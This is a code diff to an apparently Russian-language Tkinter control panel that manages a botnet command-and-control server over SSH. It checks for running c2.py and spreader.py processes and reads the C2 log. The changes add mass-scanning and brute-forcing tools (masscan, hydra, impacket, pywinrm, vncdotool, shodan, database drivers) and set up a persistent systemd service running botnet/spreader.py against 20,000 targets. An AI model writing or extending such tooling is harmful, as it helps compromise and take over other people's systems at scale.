@@ -62,10 +62,10 @@ class DiagnosticTab(ttk.Frame):
                 self.log.insert(tk.END, "--- Порты ---\n" + out + ("\n" if out else "порты не найдены\n"))
                 out, err = self._ssh_exec("ps aux | grep -E 'c2.py|spreader.py' | grep -v grep")
                 self.log.insert(tk.END, "--- Процессы ---\n" + (out if out else "нет процессов\n"))
-                deps = ['aiohttp','paramiko','redis','docker','asyncssh']
+                deps = ['aiohttp','paramiko','redis','docker','asyncssh','sshpass','impacket','pywinrm','vncdotool','pymongo','cassandra']
                 for dep in deps:
-                    out, _ = self._ssh_exec(f"python3 -c 'import {dep}' 2>&1")
-                    self.log.insert(tk.END, f"{dep}: {'OK' if 'not found' not in out else 'НЕТ'}\n")
+                    out, _ = self._ssh_exec(f"which {dep} 2>/dev/null || python3 -c 'import {dep}' 2>&1")
+                    self.log.insert(tk.END, f"{dep}: {'OK' if 'not found' not in out and 'Error' not in out else 'НЕТ'}\n")
                 out, _ = self._ssh_exec("cat /root/c2/c2.log 2>/dev/null | tail -10")
                 self.log.insert(tk.END, "--- Последние строки C2.log ---\n" + (out if out else "файл пуст или отсутствует\n"))
             except Exception as e:
@@ -82,7 +82,8 @@ class DiagnosticTab(ttk.Frame):
                 self.log.insert(tk.END, "[*] Установка зависимостей...\n")
                 cmds = [
                     "apt update -y",
-                    "pip3 install aiohttp paramiko redis docker asyncssh",
+                    "apt install -y sshpass masscan freerdp2-x11 hydra",
+                    "pip3 install aiohttp paramiko redis docker asyncssh shodan impacket pywinrm vncdotool pymongo cassandra-driver mysql-connector-python pymssql psycopg2-binary",
                 ]
                 for cmd in cmds:
                     out, err = self._ssh_exec(cmd)
@@ -106,6 +107,8 @@ After=network.target
 [Service]
 Type=simple
 ExecStart=/usr/bin/python3 -u /root/c2/botnet/spreader.py --count 20000
+StandardOutput=file:/root/c2/spreader.log
+StandardError=file:/root/c2/spreader.log
 Restart=always
 [Install]
 WantedBy=multi-user.target
